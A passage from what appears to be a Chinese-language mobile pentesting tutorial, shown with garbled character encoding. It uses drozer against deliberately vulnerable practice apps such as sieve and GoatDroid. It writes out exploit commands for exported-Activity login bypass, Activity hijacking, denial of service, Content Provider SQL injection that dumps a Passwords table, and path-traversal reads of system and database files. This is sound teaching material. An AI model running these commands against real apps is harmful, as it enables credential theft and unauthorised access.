alt="image-20221123144712299"></a></p><p>æ³¨æ„ï¼šå½“ä½¿ç”¨ adb è¿›è¡Œç«¯å£è½¬å‘ï¼Œè‹¥å‡ºç°æŠ¥é”™ï¼Œ<code>error: no devices/emulators found</code>ï¼ŒåŸå› æ˜¯æˆ‘ä»¬æ‰‹æœºæ²¡æœ‰å¼€å¯å¼€å‘è€…æ¨¡å¼ï¼Œåªéœ€æ‰“å¼€æ‰‹æœºå¼€å‘è€…æ¨¡å¼,å¼€å¯  USB è°ƒè¯•åŠŸèƒ½ï¼Œæ ¹æ®è‡ªèº«æ‰‹æœºå“ç‰Œè‡ªè¡Œè¿›è¡Œæ“ä½œï¼Œå¼€å¯åå†æ¬¡å†æ¬¡æ‰§è¡Œå‘½ä»¤ <code>adb.exe forward tcp:31415 tcp:31415</code> å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116204352994.png" data-caption="image-20221116204352994"><img src="/../images/app/Components/image-20221116204352994.png" alt="image-20221116204352994"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221117112228564.png" data-caption="image-20221117112228564"><img src="/../images/app/Components/image-20221117112228564.png" alt="image-20221117112228564"></a></p><p>æœ€åè¿›å…¥ Python27\Scripts ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤å¼€å¯ drozer ä¸æ‰‹æœºè¿æ¥é€šé“ <code>drozer.bat console connect</code>ï¼Œå¦‚æœæŠ¥é”™ <code>ImportError: No module named google.protobuf</code>ï¼Œåˆ™éœ€è¦å®‰è£…ä¾èµ–ã€‚</p><p> <a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116205442505.png" data-caption="image-20221116205442505"><img src="/../images/app/Components/image-20221116205442505.png" alt="image-20221116205442505"></a></p><p>cmd å‘½ä»¤è¡Œæ‰§è¡Œé€ä¸€å®‰è£…å³å¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip2 install protobuf -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install pyopenssl -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install pyyaml -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install twisted -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install service_identity -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div><p>å®‰è£…ä¾èµ–åå†æ¬¡æ‰§è¡Œå‘½ä»¤ <code>drozer.bat console connect</code>ï¼Œdrozer æˆåŠŸè¿æ¥æ‰‹æœºï¼Œdrozer å¯åŠ¨æˆåŠŸ</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116210214044.png" data-caption="image-20221116210214044"><img src="/../images/app/Components/image-20221116210214044.png" alt="image-20221116210214044"></a></p><p>è‡³æ­¤ drozer å®‰è£…åŠæµ‹è¯•å·²å…¨éƒ¨å®Œæˆã€‚</p><hr><h2 id="ä¸‰ã€å››å¤§ç»„ä»¶æµ‹è¯•"><a href="#ä¸‰ã€å››å¤§ç»„ä»¶æµ‹è¯•" class="headerlink" title="ä¸‰ã€å››å¤§ç»„ä»¶æµ‹è¯•"></a>ä¸‰ã€å››å¤§ç»„ä»¶æµ‹è¯•</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>ç”±ä¸Šé¢æˆ‘ä»¬çŸ¥é“ Activity ä¸ºå±•ç¤ºç»„ä»¶ï¼Œç”¨äºå‘ç”¨æˆ·ç›´æ¥å±•ç¤ºä¸€ä¸ªç•Œé¢ï¼Œè€Œä¸”å¯ä»¥æ¥å—ç”¨æˆ·çš„è¾“å…¥ä¿¡æ¯ä»è€Œè¿›è¡Œäº¤äº’ã€‚å…·ä½“æ¼æ´ç±»å‹åŠå±å®³å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| æ¼æ´ç§ç±»                  | å±å®³                                                         |</span><br><span class="line">| -------------------------| ------------------------------------------------------------ |</span><br><span class="line">| è¶Šæƒç»•è¿‡                   | Activityç”¨æˆ·ç•Œé¢ç»•è¿‡ä¼šé€ æˆç”¨æˆ·ä¿¡æ¯çªƒå–                         |</span><br><span class="line">| æ‹’ç»æœåŠ¡                   | é€šè¿‡Intentç»™Activityä¼ è¾“ç•¸å½¢æ•°æ®ä½¿å¾—ç¨‹åºå´©æºƒä»è€Œå½±å“ç”¨æˆ·ä½“éªŒ    |</span><br><span class="line">| é’“é±¼æ¬ºéª—/ActivityåŠ«æŒ       | ç»„ä»¶å¯¼å‡ºå¯¼è‡´é’“é±¼æ¬ºè¯ˆï¼ŒActivityç•Œé¢è¢«åŠ«æŒäº§ç”Ÿæ¬ºè¯ˆç­‰å®‰å…¨äº‹ä»¶      |</span><br><span class="line">| éšå¼å¯åŠ¨intentåŒ…å«æ•æ„Ÿæ•°æ®   | æ•æ„Ÿä¿¡æ¯æ³„éœ²                                                 |</span><br></pre></td></tr></table></figure></div><br/><h4 id="è¶Šæƒç»•è¿‡"><a href="#è¶Šæƒç»•è¿‡" class="headerlink" title="è¶Šæƒç»•è¿‡"></a><font color=#ffffff>è¶Šæƒç»•è¿‡</font></h4><p>åœ¨ Android ç³»ç»Ÿä¸­ï¼ŒActivity ç»„ä»¶é»˜è®¤æ˜¯ä¸å¯¼å‡ºçš„ï¼Œå¦‚æœ <code>AndroidManifest.xml</code> ä¸­è®¾ç½®äº† <code>exported = &quot;true&quot;</code> è¿™æ ·çš„å…³é”®å€¼æˆ–è€…æ˜¯æ·»åŠ äº†<code>&lt;intent-filter&gt;</code> è¿™æ ·çš„å±æ€§ï¼Œé‚£ä¹ˆæ­¤æ—¶ Activity ç»„ä»¶æ˜¯å¯¼å‡ºçš„ï¼Œå°±ä¼šå¼•å‘è¶Šæƒç»•è¿‡æˆ–è€…æ˜¯æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰çš„å®‰å…¨é£é™©ã€‚<strong>ï¼ˆæ³¨é‡Š:å¯¼å‡º-ç»„ä»¶å¯ä»¥è¢«å¤–éƒ¨åº”ç”¨è°ƒç”¨; AndroidManifest.xml-åº”ç”¨æ¸…å•ï¼Œæ¯ä¸ªAndroid APPå¿…å¤‡çš„æ–‡ä»¶é…ç½®ï¼Œåç¼–è¯‘åå¯æŸ¥çœ‹å…¶è¯¦ç»†é…ç½®ä»£ç ï¼‰</strong></p><p>ä¾‹å­:æµ‹è¯•æ ·æœ¬ sieve.apkï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/as0ler/Android-Examples">https://github.com/as0ler/Android-Examples</a></p><p>1ã€æ‰‹æœºå®‰è£… sieve.apkã€drozer-agent.apkï¼Œsieve app ç•Œé¢å¦‚ä¸‹å›¾å·¦ï¼ŒæŒ‰ç…§ä¸Šé¢æ–‡ç«  drozer å®‰è£…éƒ¨åˆ†ï¼Œé…ç½®å¥½ç›¸å…³æµ‹è¯•ç¯å¢ƒï¼Œæ‰‹æœºç«¯ç‚¹å‡» drozer å³ä¸‹è§’æ‰“å¼€ä»£ç†ï¼Œåˆ©ç”¨ adb è¿›è¡Œç«¯å£è½¬å‘ï¼Œç•Œé¢å¦‚ä¸‹å›¾å³</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230154124250.png" data-caption="image-20221230154124250"><img src="/../images/app/Components/image-20221230154124250.png" alt="image-20221230154124250"></a></p><p>adbå¼€å¯ç«¯å£è½¬å‘ï¼š<code>adb.exe forward tcp:31415 tcp:31415</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230150431447.png" data-caption="image-20221230150431447"><img src="/../images/app/Components/image-20221230150431447.png" alt="image-20221230150431447"></a></p><p>drozer è¿æ¥æ‰‹æœºï¼š<code>drozer.bat console connect</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118205504976.png" data-caption="image-20221118205504976"><img src="/../images/app/Components/image-20221118205504976.png" alt="image-20221118205504976"></a></p><p>2ã€å°è¯•åˆ©ç”¨ drozer è¶Šæƒç»•è¿‡ sieve app ç™»å½•ç•Œé¢</p><p>åˆ—å‡ºæ‰‹æœºç¨‹åºä¸­æ‰€æœ‰çš„ APP åŒ…å</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230151306269.png" data-caption="image-20221230151306269"><img src="/../images/app/Components/image-20221230151306269.png" alt="image-20221230151306269"></a></p><p>å¦‚ä¸Šå›¾å‡ºç°æ–‡å­—ä¹±ç ï¼Œè§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><p>Everything æœç´¢ï¼Œæ‰¾åˆ°ä½äº Python27 ç›®å½•ä¸‹çš„ <code>package.py</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118211507281.png" data-caption="image-20221118211507281"><img src="/../images/app/Components/image-20221118211507281.png" alt="image-20221118211507281"></a></p><p>æ·»åŠ å¦‚ä¸‹ä»£ç </p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118211715083.png" data-caption="image-20221118211715083"><img src="/../images/app/Components/image-20221118211715083.png" alt="image-20221118211715083"></a></p><p>360ã€362è¡Œæ·»åŠ å­—æ¯ u</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118211856113.png" data-caption="image-20221118211856113"><img src="/../images/app/Components/image-20221118211856113.png" alt="image-20221118211856113"></a></p><p>é‡æ–°å¯åŠ¨ drozerï¼Œå†æ¬¡æ‰§è¡Œå‘½ä»¤ <code>run app.package.list</code> åˆ—å‡ºæ‰€æœ‰æ‰‹æœºå·²å®‰è£…ç¨‹åºçš„åŒ…å</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118212227708.png" data-caption="image-20221118212227708"><img src="/../images/app/Components/image-20221118212227708.png" alt="image-20221118212227708"></a></p><p>ç”±äºåˆ—å‡ºçš„åŒ…åä¼—å¤šï¼Œæ— æ³•æ­£ç¡®åˆ†è¾¨éœ€æµ‹è¯•çš„ APP åŒ…åä¸ºå“ªä¸ªï¼Œæˆ‘ä»¬è½¬ç”¨ <a href="https://codeload.github.com/bihe0832/Android-GetAPKInfo/zip/refs/tags/V2.0.2">GetAPKInfo</a> å·¥å…·æ¥è·å– sieve app åŒ…å, <code>java -jar GetAPKInfo.jar C:\Users\Boom\Desktop\sieve.apk</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118213337410.png" data-caption="image-20221118213337410"><img src="/../images/app/Components/image-20221118213337410.png" alt="image-20221118213337410"></a></p><p>ç„¶å drozer ç›´æ¥æœç´¢åŒ…åä¿¡æ¯ com.mwr.example.sieve,è¯¥APPå…·ä½“ä¿¡æ¯å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118214341449.png" data-caption="image-20221118214341449"><img src="/../images/app/Components/image-20221118214341449.png" alt="image-20221118214341449"></a></p><p>æˆ‘ä»¬ç›´æ¥å»æŸ¥è¯¢ç›®æ ‡åº”ç”¨çš„æ”»å‡»é¢ï¼Œé€šè¿‡ä¸‹å›¾å¯çŸ¥ Activity æœ‰3ä¸ªç»„ä»¶æ˜¯å¯ä»¥å¯¼å‡ºçš„</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230150630239.png" data-caption="image-20221230150630239"><img src="/../images/app/Components/image-20221230150630239.png" alt="image-20221230150630239"></a></p><p>æŸ¥çœ‹å…·ä½“å¯å¯¼å‡ºçš„ Activity ç»„ä»¶ä¿¡æ¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230150719923.png" data-caption="image-20221230150719923"><img src="/../images/app/Components/image-20221230150719923.png" alt="image-20221230150719923"></a></p><p>è°ƒç”¨ç»„ä»¶ï¼Œå®ç°ç™»å½•ç»•è¿‡ç•Œé¢ï¼ˆç”±äºæµ‹è¯•æ ·æœ¬ä¸æ”¯æŒé«˜ç‰ˆæœ¬ Androidï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ MuMu æ¨¡æ‹Ÿå™¨è¿›è¡Œæµ‹è¯•ï¼Œå®ç°ç»•è¿‡ï¼‰ï¼Œå…¶å®ƒ Activity å¯¼å‡ºç»„ä»¶ç»•è¿‡æµ‹è¯•åªéœ€æ›´æ¢ç»„ä»¶åå³å¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230203111751.jpg" data-caption="image-20221230203111751"><img src="/../images/app/Components/image-20221230203111751.jpg" alt="image-20221230203111751"></a></p><br/><h4 id="é’“é±¼æ¬ºè¯ˆ-x2F-ActivityåŠ«æŒ"><a href="#é’“é±¼æ¬ºè¯ˆ-x2F-ActivityåŠ«æŒ" class="headerlink" title="é’“é±¼æ¬ºè¯ˆ&#x2F;ActivityåŠ«æŒ"></a><font color=#ffffff>é’“é±¼æ¬ºè¯ˆ&#x2F;ActivityåŠ«æŒ</font></h4><p>ä¾‹å­ï¼šåŠ«æŒæµ‹è¯• APP ä¸‹è½½åœ°å€:<a href="https://github.com/yanghaoi/android_app">https://github.com/yanghaoi/android_app</a></p><p>1ã€æ‰‹æœºå®‰è£…ç‚¹å‡»åŠ«æŒè½¯ä»¶ uihijackv2.0_sign.apk , drozer å¼€å¯ç«¯å£è½¬å‘ï¼Œadb è¿æ¥ drozer</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228105855609.png" data-caption="image-20221228105855609"><img src="/../images/app/Components/image-20221228105855609.png" alt="image-20221228105855609"></a></p><p>2ã€æ‰“å¼€è¢«æµ‹è½¯ä»¶ç•Œé¢ï¼Œè¿™é‡Œè¢«æµ‹è½¯ä»¶ä¹Ÿæ˜¯ä½¿ç”¨ drozerï¼Œç„¶å Windows é€šè¿‡ drozer å‘½ä»¤è°ƒç”¨åŠ«æŒè½¯ä»¶ uihijackv2.0_signï¼Œ<font color=#c3dbe8>è‹¥ uihijackv2.0_sign ç•Œé¢ä½äºè¢«æµ‹è½¯ä»¶ä¸Šï¼Œåˆ™å­˜åœ¨æ¼æ´ï¼ˆå¦‚ä¸‹å›¾ï¼‰</font>ï¼Œè‹¥è¢«æµ‹é¡µé¢æ— å˜åŒ–åˆ™ä¸å­˜åœ¨æ¼æ´ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228110911255.png" data-caption="image-20221228110911255"><img src="/../images/app/Components/image-20221228110911255.png" alt="image-20221228110911255"></a></p><br/><h4 id="æ‹’ç»æœåŠ¡æ”»å‡»"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»"></a><font color=#ffffff>æ‹’ç»æœåŠ¡æ”»å‡»</font></h4><p>ä¾‹å­ï¼šæµ‹è¯• APP ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/Funsiooo/Vuln_Bulid/blob/main/APP/OWASP-GoatDroid-0.9.zip">https://github.com/Funsiooo/Vuln_Bulid/blob/main/APP/OWASP-GoatDroid-0.9.zip</a></p><p>1ã€åˆ©ç”¨ drozer ç›´æ¥æŸ¥çœ‹æš´éœ²çš„ç»„ä»¶ï¼Œç„¶åè¿›è¡Œè°ƒç”¨ï¼ŒæŸ¥çœ‹æ˜¯å¦å‡ºç°ç¨‹åºå´©æºƒæƒ…å†µã€‚é€šè¿‡ <a href="https://codeload.github.com/bihe0832/Android-GetAPKInfo/zip/refs/tags/V2.0.2">GetAPKInfo</a> å·¥å…·æ¥è·å– APP åŒ…åä¸º <code>org.owasp.goatdroid.fourgoats</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228143353936.png" data-caption="image-20221228143353936"><img src="/../images/app/Components/image-20221228143353936.png" alt="image-20221228143353936"></a></p><p>2ã€å®‰è£… <code>OWASP GoatDroid- FourGoats Android App.apk</code> è½¯ä»¶ï¼Œåˆ©ç”¨ drozer æŸ¥çœ‹å…¶æš´éœ²ç»„ä»¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228143724432.png" data-caption="image-20221228143724432"><img src="/../images/app/Components/image-20221228143724432.png" alt="image-20221228143724432"></a></p><p>æŸ¥çœ‹å…·ä½“æš´éœ²ç»„ä»¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228143848311.png" data-caption="image-20221228143848311"><img src="/../images/app/Components/image-20221228143848311.png" alt="image-20221228143848311"></a></p><p>3ã€è°ƒç”¨ç»„ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦å¯¼è‡´æ‹’ç»æœåŠ¡ï¼Œè‹¥ç¨‹åºå‡ºç° <code>ç¨‹åºå´©æºƒ</code>ã€<code>å·²åœæ­¢è¿è¡Œ</code> ç­‰ç¨‹åºæ— æ³•è¿è¡Œæˆ–è‡ªåŠ¨é€€å‡ºè¡Œä¸ºåˆ™ä¸ºæ”»å‡»æˆåŠŸã€‚æŸ¥çœ‹ä¾‹å­ï¼š<a href="http://rui0.cn/archives/30">http://rui0.cn/archives/30</a> ï¼Œè°ƒç”¨å‘½ä»¤ä¾‹å­å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.Main</span><br></pre></td></tr></table></figure></div><br/><h3 id="Conten-Provid"><a href="#Conten-Provid" class="headerlink" title="Conten Provid"></a>Conten Provid</h3><p>æ•°æ®å…±äº«ç»„ä»¶ï¼Œç”¨äºå‘å…¶ä»–ç»„ä»¶ä¹ƒè‡³å…¶ä»–åº”ç”¨å…±äº«æ•°æ®ï¼Œç”±æ­¤å¯æ¨ç®—ï¼Œè¯¥ç»„ä»¶æ¼æ´ä¸æ•°æ®ç›¸å…³ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| æ¼æ´ç§ç±» | å±å®³            |</span><br><span class="line">| -------- | ---------------|</span><br><span class="line">| ä¿¡æ¯æ³„éœ² | æŸ¥çœ‹ç»„ä»¶æ•°æ®ä¿¡æ¯ |</span><br><span class="line">| SQLæ³¨å…¥  | æ³¨å…¥è·å–ç›¸å…³æ•°æ® |</span><br><span class="line">| ç›®å½•éå† | è®¿é—®ä»»æ„å¯è¯»æ–‡ä»¶ |</span><br></pre></td></tr></table></figure></div><br/><h4 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a><font color=#ffffff>ä¿¡æ¯æ³„éœ²</font></h4><p>1ã€ä¾ç„¶ä½¿ç”¨ seive.apk ä½œä¸ºæµ‹è¯• appï¼Œä½†éœ€è¦åœ¨ç¬¬ä¸€æ¬¡å®‰è£…æ‰“å¼€æ—¶éœ€è¦è®¾ç½®è´¦å·å¯†ç </p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228204134046.png" data-caption="image-20221228204134046"><img src="/../images/app/Components/image-20221228204134046.png" alt="image-20221228204134046"></a></p><p>2ã€åˆ©ç”¨ drozer æŸ¥çœ‹ provider æ•°æ®ç»„ä»¶å…·ä½“çš„æ”»å‡»é¢</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228151737611.png" data-caption="image-20221228151737611"><img src="/../images/app/Components/image-20221228151737611.png" alt="image-20221228151737611"></a></p><p>3ã€å¯¹ <code>com.mwr.example.sieve.DBContentProvider</code> æ”»å‡»é¢è¿›è¡Œæµ‹è¯•ï¼Œåˆ—å‡º URI</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.finduri com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228151941707.png" data-caption="image-20221228151941707"><img src="/../images/app/Components/image-20221228151941707.png" alt="image-20221228151941707"></a></p><p>4ã€åˆ©ç”¨ drozer æ‰«ææ¨¡å—å¯¹åˆ—å‡ºçš„ URI è¿›è¡Œæ‰«æï¼ŒæŸ¥çœ‹å¯è®¿é—®çš„ URI ï¼Œä¸‰ä¸ª URI å¯è®¿é—®</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228152408647.png" data-caption="image-20221228152408647"><img src="/../images/app/Components/image-20221228152408647.png" alt="image-20221228152408647"></a></p><p>5ã€è®¿é—®URIï¼ŒæŸ¥çœ‹å…·ä½“å†…å®¹ ï¼Œç”±ä¸‹å›¾å¯çŸ¥ï¼Œåˆšæ‰æˆ‘ä»¬æ‰€å¡«çš„æ•°æ®å…¨éƒ¨åˆ—äº†å‡ºæ¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154520099.png" data-caption="image-20221228154520099"><img src="/../images/app/Components/image-20221228154520099.png" alt="image-20221228154520099"></a></p><br/><h4 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a><font color=#ffffff>SQLæ³¨å…¥</font></h4><p>1ã€è¿›ä¸€æ­¥æµ‹è¯•å¯è®¿é—®çš„ URI æ˜¯å¦å­˜åœ¨æ³¨å…¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure></div><p>å‡ºç°è¯­æ³•é”™è¯¯ï¼Œå­˜åœ¨SQLæ³¨å…¥</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228153720244.png" data-caption="image-20221228153720244"><img src="/../images/app/Components/image-20221228153720244.png" alt="image-20221228153720244"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228153747173.png" data-caption="image-20221228153747173"><img src="/../images/app/Components/image-20221228153747173.png" alt="image-20221228153747173"></a></p><p>2ã€åˆ©ç”¨ drozer å†…ç½®æ³¨å…¥æ‰«ææ¨¡å—è¿›è¡Œæ‰«æ,æ‰«æå­˜åœ¨æ³¨å…¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154604350.png" data-caption="image-20221228154604350"><img src="/../images/app/Components/image-20221228154604350.png" alt="image-20221228154604350"></a></p><p>3ã€ç»§ç»­åˆ©ç”¨ï¼Œåˆ—å‡ºæ‰€æœ‰æ•°æ®è¡¨ï¼Œå¾—çŸ¥æ•°æ®åº“è¡¨æœ‰ <code>name</code>ã€<code>android_metadata</code>ã€<code>Passwords</code>ã€<code>Key</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154446929.png" data-caption="image-20221228154446929"><img src="/../images/app/Components/image-20221228154446929.png" alt="image-20221228154446929"></a></p><p>4ã€å•ç‹¬æŸ¥çœ‹è¡¨ä¸­æ•°æ®ï¼Œä¾‹æŸ¥è¯¢ <code>Passwords</code> è¡¨æ•°æ®</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Passwords;--&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228154427706.png" data-caption="image-20221228154427706"><img src="/../images/app/Components/image-20221228154427706.png" alt="image-20221228154427706"></a></p><br/><h4 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a><font color=#ffffff>ç›®å½•éå†</font></h4><p>1ã€åˆ©ç”¨ drozer è‡ªå¸¦æ¨¡å—æ‰«æç›®å½•éå†ï¼Œå­˜åœ¨ä¸¤ä¸ªæ¼æ´ <code>content://com.mwr.example.sieve.FileBackupProvider/</code>,<code>content://com.mwr.example.sieve.FileBackupProvider</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228160057841.png" data-caption="image-20221228160057841"><img src="/../images/app/Components/image-20221228160057841.png" alt="image-20221228160057841"></a></p><p>2ã€å¯¹å…¶ URI è¿›è¡Œæ–‡ä»¶è¯»å–</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228160259984.png" data-caption="image-20221228160259984"><img src="/../images/app/Components/image-20221228160259984.png" alt="image-20221228160259984"></a></p><p>3ã€è¯»å–æ›´å¤šä¿¡æ¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228160839383.png" data-caption="image-20221228160839383"><img src="/../images/app/Components/image-20221228160839383.png" alt="image-20221228160839383"></a></p><p>4ã€ä¸‹è½½æ–‡ä»¶ 